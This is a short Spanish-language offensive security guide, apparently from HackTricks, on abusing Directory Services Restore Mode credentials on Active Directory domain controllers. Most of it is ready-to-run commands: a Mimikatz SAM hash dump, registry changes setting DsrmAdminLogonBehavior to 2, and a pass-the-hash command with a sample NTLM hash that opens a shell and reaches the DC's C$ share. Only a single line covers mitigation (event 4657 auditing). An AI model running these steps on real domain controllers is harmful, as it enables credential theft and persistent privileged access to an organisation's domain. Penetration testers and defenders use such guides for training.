{{#include ../../banners/hacktricks-training.md}}

# Credenciales DSRM

Hay una cuenta de **administrador local** dentro de cada **DC**. Teniendo privilegios de administrador en esta máquina, puedes usar mimikatz para **extraer el hash del Administrador local**. Luego, modificando un registro para **activar esta contraseña** para que puedas acceder de forma remota a este usuario Administrador local.\
Primero necesitamos **extraer** el **hash** del usuario **Administrador local** dentro del DC:
```bash
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
```
Luego necesitamos verificar si esa cuenta funcionará, y si la clave del registro tiene el valor "0" o no existe, necesitas **configurarla a "2"**:
```bash
Get-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior #Check if the key exists and get the value
New-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD #Create key with value "2" if it doesn't exist
Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2  #Change value to "2"
```
Luego, usando un PTH puedes **listar el contenido de C$ o incluso obtener un shell**. Ten en cuenta que para crear una nueva sesión de powershell con ese hash en memoria (para el PTH) **el "dominio" utilizado es solo el nombre de la máquina DC:**
```bash
sekurlsa::pth /domain:dc-host-name /user:Administrator /ntlm:b629ad5753f4c441e3af31c97fad8973 /run:powershell.exe
#And in new spawned powershell you now can access via NTLM the content of C$
ls \\dc-host-name\C$
```
Más información sobre esto en: [https://adsecurity.org/?p=1714](https://adsecurity.org/?p=1714) y [https://adsecurity.org/?p=1785](https://adsecurity.org/?p=1785)

## Mitigación

- ID de evento 4657 - Auditoría de creación/cambio de `HKLM:\System\CurrentControlSet\Control\Lsa DsrmAdminLogonBehavior`

{{#include ../../banners/hacktricks-training.md}}
